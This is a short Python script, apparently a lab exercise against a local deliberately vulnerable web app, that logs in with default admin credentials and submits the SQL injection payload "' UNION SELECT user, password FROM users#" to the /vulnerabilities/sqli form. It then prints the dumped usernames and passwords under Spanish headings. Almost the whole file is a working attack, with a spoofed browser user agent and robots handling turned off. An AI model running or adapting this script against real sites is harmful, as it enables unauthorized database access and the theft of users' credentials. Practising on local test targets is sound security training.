#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import mechanize
from bs4 import BeautifulSoup

br = mechanize.Browser()

br.set_handle_equiv(False)
br.set_handle_robots(False)

br.addheaders = [("User-Agent", 
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")]

BASE_URL = 'http://localhost:8080'
PATH = '/vulnerabilities/sqli'

br.open(BASE_URL)
br.select_form(nr=0)

br['username'] = "admin"
br['password'] = "password"
br.submit()

br.open(BASE_URL+PATH)

br.select_form(nr=0)
br['id'] = "' UNION SELECT user, password FROM users#"
br.submit()

dataResponse = br.response().read().decode("utf-8")
soup = BeautifulSoup(dataResponse, 'html.parser')
  
def printInformation(soup):
  for i in soup.select_one("h1") :
    print("=== Título" , i.text, "=== \n")
    
  print("=== Resultados del SQL Injection === \n")
  for i in soup.find_all('pre'):
    print(i.text)
  
printInformation(soup)	
  

